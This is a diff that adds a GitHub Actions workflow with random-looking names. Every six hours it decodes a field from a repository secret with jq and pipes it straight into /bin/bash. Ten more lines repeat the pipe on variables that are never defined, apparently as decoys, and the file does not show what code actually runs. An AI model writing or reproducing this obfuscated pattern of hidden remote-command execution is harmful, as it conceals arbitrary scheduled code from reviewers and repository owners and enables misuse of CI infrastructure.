@@ -1,0 +1,29 @@
+name: zhuanxiagjiaozhou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuanxiagjiaozhou
+        env:
+          hzi5: ${{ secrets.hzi5 }}
+        run: |
+          echo $hzi5 | jq -r .rxql815 | /bin/bash
+          echo $ta197 | jq -r .dvk9 | /bin/bash
+          echo $xnc0904 | jq -r .xu936 | /bin/bash
+          echo $c72748 | jq -r .ocdw36163 | /bin/bash
+          echo $p72 | jq -r .jvxqp1 | /bin/bash
+          echo $a54110 | jq -r .yfk8528 | /bin/bash
+          echo $e69 | jq -r .jpa4812 | /bin/bash
+          echo $a26113 | jq -r .qus1451 | /bin/bash
+          echo $rymb25 | jq -r .hul703 | /bin/bash
+          echo $by3637 | jq -r .oeww97 | /bin/bash
+          echo $r35 | jq -r .f0368 | /bin/bash
+
